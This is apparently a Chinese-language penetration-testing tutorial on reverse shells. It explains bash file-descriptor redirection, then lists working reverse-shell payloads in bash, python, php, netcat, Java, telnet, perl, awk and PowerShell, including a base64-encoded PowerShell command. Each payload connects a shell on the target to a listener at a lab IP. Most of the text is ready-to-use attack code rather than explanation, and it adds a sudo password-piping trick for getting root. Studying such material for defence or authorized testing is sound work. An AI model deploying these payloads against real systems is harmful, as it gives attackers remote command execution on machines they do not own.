---
title: 反弹shell原理及分析
date: 2023-09-03T15:29:52+08:00
updated: 2023-08-15T16:34:48+08:00
categories: 
- 渗透测试
- 技术原理与分析
---

## 反向shell工作原理

### 为什么需要反向shell

为了控制目标系统，我们都会尝试去获取交互式shell，而大部分的系统都处在防火墙之后，大部分服务器只接受指定端口的连接，例如web服务器只接受80端口和443端口的连接，我们想要正向直接获取shell是不太可能的事情，但大部分防火墙并不限制传出连接，因此我们需要反向shell

### 工作原理

反向shell与正向shell相反，监控端监听某端口的tcp/UDP连接，目标主机发送连接请求到该端口，并将其输入输出转换到监控端，实现了角色的反转

## 反向shell命令的分析

我们可以先通过linux系统来分析最常见的反向shell命令

```
测试环境：
攻击机：kali-linux : 192.168.121.135
目标机: kali-linux :  192.168.121.140
```

先来看看下面这条命令,我们从左往右逐步进行分析

```
bash -i >& /dev/tcp/own_ip/7777 0>&1
```

**bash -i**

Bash是一个命令处理器，能执行用户直接输入的命令,bash -i 命令的意思则是打开一个交互式shell

**/dev/tcp/**

bash支持对伪设备文件/dev/tcp/host/port的读写操作，/dev/tcp并不是存在于系统下的真实文件，而是虚拟设备文件之一，为tcp提供连接，同样的也有/dev/udp/等，当我们使用bash或是在bash shell中使用内置命令时，就会连接到对应的服务器端口号

**文件描述符与重定向**

linux系统下常用文件描述符

```
标准输入(0)  < or <<     -->stdin
标准输出(1)  > or >>	-->stdout
标准错误输出(2) 2> or 2>> 	-->stderr
```

重定向

```
shell > 文件 将shell数据输出到文件
shell >> 文件   以追加的形式输出到文件，不会删除源文件
shell < 文件	  从文件读进成为命令的参数
命令 << 分解符   从标准输入中读入，直到遇到分界符停止
```

描述符&

详细介绍：https://www.gnu.org/software/bash/manual/bash.html#Duplicating-File-Descriptors

我们可以将&看作是一个取地址的操作，方便理解，事实上在linux文件操作中使用&符号是合并数据流的方法，例如stdout和stderr两个输出流是分开的，我们就可以通过使用&的方式，将两个流合并输出在同一个文件中

```
eg:
cat flag.txt > output.txt    --> 将cat flag.txt的标准输出重定向到output.txt中
cat flag.txt &> output.txt   --> 将cat flag.txt的标准输出和标准错误输出都重定向到output.txt中
&>等同于>&
与上面命令类似的 
cat flag.txt > output.txt 2>&1  -->  2>&1代表着将标准错误输出重定向到标准输出中
```

能够理解上面的内容就可以回来看我们的命令了

0>&1

根据理解，这条命令的意思应该是将标准输入重定向到标准输出中，测试下0>&1与0<&1是否相同

```
bash -i >& /dev/tcp/own_ip/7777 0>&1
bash -i >& /dev/tcp/192.168.121.135/7777 0<&1
经测试二者作用效果相同，均能获取交互式shell
```

以上，整条命令的意思应为启动一个交互式shell并定向到攻击机上，并且将输入的命令和输出的内容也定向到攻击机上

类似的我们可以使用其他命令连接

```
0<&196;exec 196<>/dev/tcp/192.168.121.135/7777; /bin/bash <&196 >&196 2>&196
```

采取临时文件描述符数字进行反向shell

```
/bin/bash -l > /dev/tcp/192.168.121.135/7777 0<&1 2>&1
```

利用bash -l 参数，从普通shell获取交互式shell

```
sh -i >& /dev/udp/192.168.121.135/7777 0>&1

listener
nc -u -lvp 7777
```

采取udp协议进行连接

**注意**：不要忘记测试sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash等shell

## 不同服务的反向shell

### python

```python
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.121.135",7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'#也可以使用bash等
```

```
socket库：socket库是Python提供的一个标准库，它实现了网络通信的基本功能。使用socket库可以方便地传输数据，包括TCP和UDP等协议。通过socket库，可以创建网络套接字并进行网络通信，同时也支持多种网络编程模型，如客户端-服务器模型、点对点模型等。

os库：os库是Python提供的一个标准库，它提供了许多对操作系统进行交互的函数。os模块中包含了许多文件操作相关的方法，如创建文件夹、删除文件、改变文件权限、遍历目录等操作。此外，os库还提供了一些与进程管理相关的函数，如启动新进程、杀死进程、获取进程ID等。

pty库：pty库是Python中的一个伪终端处理库，它使用管道和TTY设备来创建伪终端，这样程序就可以像在终端上运行时一样和用户交互。pty库不仅可以用于与终端的交互，还可以用于测试和调试程序。在pty库中，最常用的两个函数是：spawn()和fork()。spawn()函数会启动一个新进程，并将其连接到一个伪终端；而fork()函数则会先创建一个子进程，再在子进程中启动并连接到伪终端。
```

分析如下

```python
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); #创建一个TCP服务器
#socket.socket()函数，创建一个套接字，用于接收和发送数据
#socket.AF_INET表示使用IPv4进行通信，IPv6-->AF_INET6
#type=SOCK_STREAM表示流式套接字，基于TCP协议，同样UDP协议可以采用SOCK_DHRAM(数据报套接字)
s.connect(("192.168.121.135",7777));
#通过已经创建的TCP服务器连接到攻击机地址
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
#s.fileno()函数获取一个socket对象的文件描述符，os.dup2()将文件描述符复制三次，分别设为标准输入，标准输出和标准错误输出，0，1，2分别为linux下的文件描述符
pty.spawn("/bin/sh")'
#spawn()函数用于在伪终端（pseudo-terminal，简称pty）上运行指定的命令，并返回一个与伪终端关联的进程的PID（process ID），即启动一个新进程，并执行/bin/sh命令用于开启一个交互式shell终端
```

综上分析，我们通过调用python的三个库开启了一个交互式shell的终端，并将该终端的标准输出，标准输入，错误标准输出绑定到我们开启的TCP服务上，即在攻击机上取得了shell

效果如下:

![protecter-shell](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\protecter-shell.png)

![attacker-listen](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\attacker-listen.png)

```python
#IPv4（无空格，缩写）
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("192.168.121.135",7777));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
#IPv6
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("ipv6地址",7777,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
#IPv6（无空格，缩写）
python -c 'a=__import__;c=a("socket");o=a("os").dup2;p=a("pty").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect(("IPv6地址",7777,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

### php

若目标服务器存在php服务，可以采用php -r 'code'的形式进行反向shell

例如

```php
php -r '$sock=fsockopen("192.168.121.135",7777);exec("/bin/sh -i <&3 >&3 2>&3");'
```

同样分析以下这段命令,如下

```php
$sock=fsockopen("192.168.121.135",7777);
/*fsockopen函数是PHP中用于通过TCP/IP协议建立socket连接的函数之一，可以用于向远程主机发送数据和接收响应
其中hostname和port是必选参数，建立连接后可以分别使用fwrite,fread,fclose向服务器发送数据，读取数据以及关闭连接，需要注意的是如果使用http协议，需要自行添加请求包*/
exec("/bin/sh -i <&3 >&3 2>&3");
/*建立连接后，使用exec函数在当前程序执行/bin/sh -i命令，打开一个交互式终端，这里使用文件描述符3，将0，1，2都定向到socket连接上进行处理*/
```

效果如下：

![php-nc](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\php-nc.png)

![php-nc-recive](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\php-nc-recive.png)

除了exec函数，我们可以使用system,shell_exec,passthru,反引号包裹,popen,proc等来进行代替，例如使用popen

```php
php -r '$sock=fsockopen("192.168.121.135",7777);popen("/bin/bash <&3 >&3 2>&3", "r");'
```

### NetCat

netcat的反向shell较为简单，只需要使用nc命令即可，例如

```shell
nc -e /bin/bash 192.168.121.135 7777
listen:
nc -lvnp 7777
```

注意：netcat openbsd等不同操作系统自带的netcat

```shell
eg:
openbsd
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.121.135 7777 >/tmp/f
#这个命令在kali-linux系统下使用时仍然成立
```

### Java

```java
public class shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.121.135/7777 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

将该shell写入文件例如1.java并在目标服务器上执行java 1.java即可得到反向shell

分析如下:

```java
Process p;
//定义一个Process类的成员变量p，该变量用于执行外部进程
p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/192.168.121.135/7777 0>&1");
//java中利用Runtime.getRuntime().exec()方法执行指定的命令，上述代码直接执行了bash命令，并将输入输出定向到攻击机
p.waitfor();
//该代码受限于exec()方法的进程，exec()方法的启动进程是异步执行的，我们需要waitfor()方法等待进程执行完毕，否则无法得到结果，同时为了避免死锁的情况，我们需要及时关闭进程的输入，输出和错误流等资源
p.destroy();
//用于关闭进程，防止上述情况的发生
```

效果如下：

![java_reverse_shell](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\java_reverse_shell.png)

![java_reverseshell_atk](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\java_reverseshell_atk.png)

类似的函数还有ProcessBuilder

```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class shell {
    public static void main(String[] args) {
        String host = "192.168.121.135";
        int port = 7777;
        String cmd = "/bin/bash";
        try {
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host, port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while (!s.isClosed()) {
                while (pi.available() > 0)
                    so.write(pi.read());
                while (pe.available() > 0)
                    so.write(pe.read());
                while (si.available() > 0)
                    po.write(si.read());
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                } catch (Exception e) {}
            }
            p.destroy();
            s.close();
        } catch (Exception e) {}
    }
}
```

### TelNet

TelNet是一种基于TCP的远程登录协议，可直接在两台主机上建立交互式会话，OPENSSH就使用了telnet协议

如何使用:

```shell
TF=$(mktemp -u);mkfifo $TF && telnet 192.168.121.135 7777 0<$TF | /bin/bash 1>$TF
```

分析一下：

```shell
TF=$(mktemp -u); 
#将TF设置为mktemp -u的输出，mktemp -u表示在临时目录中生成唯一文件名，-u表示仅返回文件名并不实际创建文件
mkfifo $TF
#创建一个命名管道，文件名由变量TF指定
telnet 192.168.121.135 7777 0<$TF
#使用telnet协议远程连接服务，并将telnet标准输入重定向为从管道获取，即通过命名管道发送的文本都将定向到telnet显示
| /bin/bash 1>$TF
#将telnet命令输出到/bash下，启动一个新的bash shell，并将标准输出重定向到命名管道
```

效果如下：

![telnet_reverse_shell_1](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\telnet_reverse_shell_1.png)

![telnet_reverse_shell_2](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\telnet_reverse_shell_2.png)

方法2：

```shell
telnet 192.168.121.135 7777 | /bin/sh | telnet 192.168.121.135 4444
```

该方法需要开启两个监听

```
nc -lvnp 7777
nc -lvnp 4444
```

分析如下：

```shell
telnet 192.168.121.135 7777 
#通过telnet协议连接到VPS
| /bin/sh 
#将连接到的主机的输出作为 /bin/sh的输入
| telnet 192.168.121.135 4444
#将/bin/sh的输出传递到4444端口
```

效果如下：

![telnet_reverse_shell_3](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\telnet_reverse_shell_3.png)

![telnet_reverse_shell_4](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\telnet_reverse_shell_4.png)

### Perl

```perl
perl -e 'use Socket;$i="192.168.121.135";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

与python类似，都是利用了socket模块，这里就只介绍后面的内容

```shell
if(connect(S,sockaddr_in($p,inet_aton($i)))){.....code......}
#这里采用if(){}的语法格式，表示如果连接到指定地址的端口，就执行{}中的代码
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S")
#重定向操作，三个文件操作都被定向到S,这里的S是我们再上面的代码中创建的tcp协议套接字
exec("/bin/bash -i");
#执行/bin/bash -i操作，开启交互式shell
```

效果如下:

![telnet_reverse_shell_1](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\telnet_reverse_shell_1.png)

![perl_reverse_shell_2](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\perl_reverse_shell_2.png)

或者采用没有sh的形式

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.121.135:7777");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Powershell

将shell保存在windows上.ps1文件，直接执行脚本即可实现反向shell

```powershell
$LHOST = "192.168.121.135"; $LPORT = 7777; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

但powershell默认情况下不允许执行未签名脚本，需要设置执行策略

```powershell
Set-ExecutionPolicy RemoteSigned
```

### AWK

awk 是一种文本处理工具，可以用于处理文本文件中的数据,通常会自带在linux系统下，如果目标有awk，我们可以利用awk中的网络连接功能反向shell

```shell
awk 'BEGIN {s = "/inet/tcp/0/192.168.121.135/7777"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

**当然服务远不止这些，需要根据目标主机上的服务选择对应的shell**

## 不同系统的反向shell

### centos与ubuntu

测试环境

```
目标机
ubuntu 22.04  --> 192.168.121.138
centos 6.5   --> 192.168.121.139
用户均为uu2fu3o，无root权限
监听端
kali-linux --> 192.168.121.135
kali-linux  --> 192.168.121.140
```

我们采取相同的bash命令获取反向shell

```
/bin/bash -i >& /dev/tcp/listen-ip/7777 0>&1`
```

当监听端分别获取shell之后，我们尝试通过密码获取root权限

ubuntu的测试结果

![ubuntu_reverse_shell_test1](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\ubuntu_reverse_shell_test1.png)



centos6.5的测试结果

![centos_revershell_test1](E:\笔记软件\笔记\渗透测试\技术原理与分析\reverse_shell_photo\centos_revershell_test1.png)

发现报错，报错内容如下

```
standard in must be a tty
```

大致意思是标准输入必须是一个终端设备，也就是tty,当一个命令或程序需要从标准输入中读取数据时，会检查标准输入是否连接到一个tty,如果连接到的是一个文件或管道则无法执行命令

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

centos自带python服务，我们通过python服务启一个模拟终端即可进行交互

也可以通过script和socat进行一个伪造终端

```shell
script /dev/null
```

如果目标没有python服务，我们可以使用其他工具，这里不再模拟，我打算直接模拟一个bash直接用用户密码登录root的命令，下面这个条命令在靶机上执行可以正常获取root权限

```shell
bash `echo "password"`|sudo -SE su </dev/tty 
```

 在经过比对之后，发现centos6.5允许非tty客户端登录root用户，需要更改配置文件/etc/sudoers

```
sudo vim /etc/sudoers 
```

命令会直接挂需要在靶机上输入密码，同样的在使用上面一条命令登陆时输入密码后，命令也会挂起，这部分就留到提权来讲了

### Windows

Window反弹shell主要采用windows自带的powershell，如果有python等脚本服务，也可以使用python等

```powershell
$LHOST = "192.168.121.135"; $LPORT = 7777; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```

似乎可以直接执行，下面是base64形式

```powershell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMgAxAC4AMQAzADUAIgAsADcANwA3ADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

python3-windows

```python
python -c "import socket, os, threading, subprocess as sp;p=sp.Popen(['cmd.exe'], stdin=sp.PIPE, stdout=sp.PIPE, stderr=sp.STDOUT);s=socket.socket();s.connect(('192.168.121.135', 7777));t1=threading.Thread(target=lambda: [s.sendall(p.stdout.read(1)) for _ in iter(lambda:p.stdout.read(1), b'') if _ != b'\r']);t2=threading.Thread(target=lambda: [p.stdin.write(s.recv(1024)) for _ in iter(lambda:s.recv(1024), b'')]);t1.daemon=t2.daemon=True;t1.start();t2.start();t1.join();t2.join();s.close()"
```

上述代码能够正确连接一个持续性shell，但没有处理乱码问题

## 参考链接

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
